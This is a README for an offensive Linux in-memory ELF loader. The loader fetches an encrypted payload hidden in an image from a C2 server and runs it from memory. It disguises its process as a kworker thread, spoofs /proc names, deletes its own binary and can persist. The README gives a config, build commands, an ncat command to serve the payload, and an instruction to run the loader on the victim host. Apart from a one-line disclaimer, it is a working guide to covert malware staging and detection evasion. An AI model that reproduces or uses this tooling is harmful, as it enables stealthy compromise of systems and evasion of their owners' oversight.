## In-Memory Loader for Linux

This tool implements an **in-memory ELF loader** for Linux systems. It connects to a remote C2 (Command & Control) server over TCP, downloads a ELF payload (optionally encrypted and embedded in a decoy image), and executes it directly from memory using `memfd_create()`.

> ⚠️ **For educational and authorized use only.**
> Do not use this tool on systems you do not own or lack explicit permission to operate on.


### Key Features

* Pulls a payload from a remote C2 or local image file
* Optional AES-256-CBC encryption with a custom marker
* Uses `memfd_create()` to execute from memory with no filesystem drop
* Fake process name via `argv[0]` to evade process listings
* Temporary symlink spoofing to set custom `/proc/<pid>/status` names
* Deletes itself via `unlink("/proc/self/exe")` after startup
* Optional persistence by writing the payload+image to disk

### Configuration & Build

You define all parameters in a `config.json` file. The Python builder script (`builder.py`) handles:

* Payload encryption and embedding
* Loader patching with C constants
* Marker injection and key generation

#### Example `config.json`:

```json
{
  "image": "input.png",
  "binary": "payload.elf",
  "password": "supersecret",
  "output": "out.png",
  "loader": "loader.c",
  "patched": "loader_patched.c",
  "C2_IP": "192.168.1.10",
  "C2_PORT": 4444,
  "FAKE_PROC": "[kworker/0:1-events]",
  "FD_NAME": "error",
  "PROC_LINK": "/tmp/.cache-update",
  "EXTRACT_PATH": "/tmp/.hidden.png",
  "marker": "ENCRYPTED_PAYLOAD"
}
```

#### Build it:

```bash
python3 builder.py --config config.json
```

### Payload Input Modes

The payload can be retrieved and decrypted in **two ways**:

1. **Remote Plain ELF**
   The payload is served directly over the socket (no encryption).

2. **Remote or Local Encrypted Image**
   The encrypted payload is embedded into an image file and appended after a marker. The loader will:

   * Check for `EXTRACT_PATH` and load it if available
   * Otherwise, connect to the C2 to download it
   * Decrypt it using the marker and AES key

### Execution Modes

The loader supports **three execution modes**, based on configuration:

#### 1. In-Memory Only (Default)

If `PROC_LINK` is **empty**:

* Payload is loaded into memory using `memfd_create()`
* Executed via `fexecve()`
* No disk artifacts remain
* `/proc/<pid>/status` will show a numeric name (e.g., `Name: 5`)

#### 2. Temporary Symlink Execution

If `PROC_LINK` is **set**:

* A symlink is created to `/proc/self/fd/<fd>` (e.g. `/tmp/.cache`)
* The process is executed through the symlink to spoof its name
* The symlink is deleted automatically after a short delay (\~1s)
* This provides stealthier `/proc/<pid>/status` entries

#### 3. Persistence via Local Extraction

If `EXTRACT_PATH` is **set**:

* The encrypted image is stored on disk
* On subsequent runs, the loader will use this instead of redownloading
* Useful in restricted environments where remote access is limited

### Usage

1. **Generate the loader and image**:

```bash
python builder.py --config config.json
```

2. **Compile payload**:

```bash
gcc -o loader loader_build.c -lcrypto
```

3. **Serve the payload (if no EXTRACT\_PATH)**:

```bash
ncat -lvnp 4444 < encrypted.png
```

4. **Execute the loader on the victim host**:

```bash
./loader
```

### Forensics Traces

```bash
$ ps aux | grep kworker
root     1023  0.0  0.0   2344   500 ?        Ss   14:01   0:00 [kworker/0:1-events]
root     1025  0.0  0.0   3040  1428 pts/0    S+   14:01   0:00 grep kworker

$ cat /proc/1023/maps | grep memfd
00400000-00401000 r-xp 00000000 00:01 1234      /memfd:error (deleted)
0041f000-00420000 r--p 0000f000 00:01 1234      /memfd:error (deleted)
```
